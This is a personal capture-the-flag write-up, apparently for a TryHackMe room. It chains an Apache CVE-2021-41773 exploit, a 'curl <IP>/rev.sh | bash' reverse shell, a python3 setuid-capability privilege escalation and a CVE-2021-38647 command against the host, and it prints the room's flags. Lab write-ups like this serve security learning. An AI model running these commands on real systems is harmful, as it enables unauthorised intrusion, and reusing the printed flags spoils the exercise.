I get RCE control over the webserver
https://github.com/thehackersbrain/CVE-2021-41773/blob/main/exploit.py

Send my self a reverse shell

```php
curl <IP>/rev.sh | bash
```

Linpeas reveals a vulnerabilitiy with python capabilities

![[Pasted image 20240725083003.png]]

![[Pasted image 20240725083030.png]]

![[Pasted image 20240725083202.png]]

https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

This exploit makes me root of the docker container

```php
getcap -r / 2>/dev/null
pwd
ls -al python3
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
```


**User.txt**
_THM{eacffefe1d2aafcc15e70dc2f07f7ac1}_

Inside docker

![[Pasted image 20240725083705.png]]

Here as we can see that the interface **eth0** have the **IP Address**: **172.17.0.2**, so as we know that this is the **docker** container and then the machine's or the host's IP will be **172.17.0.1**.

https://github.com/AlteredSecurity/CVE-2021-38647

```php
# Execute command on the target machine.
python CVE-2021-38647.py -t 40.87.92.228 -p 5986 -c id
```

![[Pasted image 20240725085249.png]]

**root.txt**
_THM{7f147ef1f36da9ae29529890a1b6011f}_

---

**Completed:** _08:53 2024-07-25_
